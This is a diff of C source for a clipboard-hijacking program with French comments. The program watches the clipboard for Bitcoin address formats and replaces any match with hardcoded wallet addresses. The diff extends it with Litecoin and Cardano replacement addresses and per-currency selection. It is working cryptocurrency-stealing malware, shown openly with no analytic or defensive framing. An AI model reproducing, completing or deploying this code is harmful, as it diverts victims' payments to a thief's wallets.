@@ -7,20 +7,34 @@
 
 StateCodeProcess main(void)
 {
+    // Définition des états de la machine à états
     typedef enum {
         STATE_ANALYZE_CLIPBOARD,
         STATE_MODIFY_CLIPBOARD,
         STATE_CLEAN_CLIPBOARD,
     } StateCodeFunction;
 
+    // Définition des cryptomonnaies à surveiller
+    typedef enum {
+        BITCOIN,
+        LITECOIN,
+        CARDANO,
+    } Cryptocurrency;
+
+    // Définition de la taille du buffer pour stocker le texte du presse-papiers
     size_t buffer_size = 256;
     wchar_t buffer[buffer_size];
 
+    // Définition des adresses de cryptomonnaies
     const wchar_t *bitcoin_address = L"bc1qz6nadfl5t8ul977walgphmslclez599t680gxl";
-    size_t size_bitcoin_address = getStringSize(bitcoin_address);
+    const wchar_t *litecoin_address = L"LVeu6wYARDbNerc8Y1VTfLj9xY6zPiDdyt";
+    const wchar_t *cardano_address = L"addr1q89vex35tegzhwnjx473uwj9z5hfrmxrqeq45faqj4d2x0x2ejdrghjs9wa8ydtarcay29fwj8kvxpjptgn6p9265v7qj9l407";
 
+    // Définition des variables pour la machine à états
+    Cryptocurrency cryptocurrency;
     StateCodeFunction state = STATE_ANALYZE_CLIPBOARD;
 
+    // Machine à états principale pour surveiller et modifier le presse-papiers
     while (true) {
         switch (state) {
             case STATE_ANALYZE_CLIPBOARD:
@@ -47,6 +61,7 @@ StateCodeProcess main(void)
                 // Vérification adresse P2PKH
                 if (buffer[0] == L'1') {
                     if (text_size >= 26 && text_size <= 35) {
+                        cryptocurrency = BITCOIN;
                         Sleep(500);
                         state = STATE_MODIFY_CLIPBOARD;
                         break;
@@ -56,6 +71,7 @@ StateCodeProcess main(void)
                 // Vérification adresse P2SH
                 if (buffer[0] == L'3') {
                     if (text_size >= 26 && text_size <= 35) {
+                        cryptocurrency = BITCOIN;
                         Sleep(500);
                         state = STATE_MODIFY_CLIPBOARD;
                         break;
@@ -65,6 +81,7 @@ StateCodeProcess main(void)
                 // Vérification adresse Bech32
                 if (buffer[0] == L'b' && buffer[1] == L'c' && buffer[2] == L'1' && buffer[3] == L'q') {
                     if (text_size == 42 || text_size == 62) {
+                        cryptocurrency = BITCOIN;
                         Sleep(500);
                         state = STATE_MODIFY_CLIPBOARD;
                         break;
@@ -74,6 +91,7 @@ StateCodeProcess main(void)
                 // Vérification adresse Bech32m
                 if (buffer[0] == L'b' && buffer[1] == L'c' && buffer[2] == L'1' && buffer[3] == L'p') {
                     if (text_size == 62) {
+                        cryptocurrency = BITCOIN;
                         Sleep(500);
                         state = STATE_MODIFY_CLIPBOARD;
                         break;
@@ -85,12 +103,26 @@ StateCodeProcess main(void)
 
             case STATE_MODIFY_CLIPBOARD:
 
-                if (setClipboardText(bitcoin_address, size_bitcoin_address) == STATE_ERROR) {
+                wchar_t *crypto_address;
+                if (cryptocurrency == BITCOIN) {
+                    crypto_address = bitcoin_address;
+                } else if (cryptocurrency == LITECOIN) {
+                    crypto_address = litecoin_address;
+                } else if (cryptocurrency == CARDANO) {
+                    crypto_address = cardano_address;
+                } else {
+                    printf("[ERROR] -- Unknown cryptocurrency.\n");
+                    return STATE_ERROR;
+                }
+
+                size_t size_crypto_address = getStringSize(crypto_address);
+
+                if (setClipboardText(crypto_address, size_crypto_address) == STATE_ERROR) {
                     printf("[ERROR] -- Failed to set clipboard text.\n");
                     return STATE_ERROR;
                 }
 
-                if (setClipboardText(bitcoin_address, size_bitcoin_address) == STATE_WARNING) {
+                if (setClipboardText(crypto_address, size_crypto_address) == STATE_WARNING) {
                     printf("[WARNING] -- Some issues could occur during the execution.\n");
                 }
 
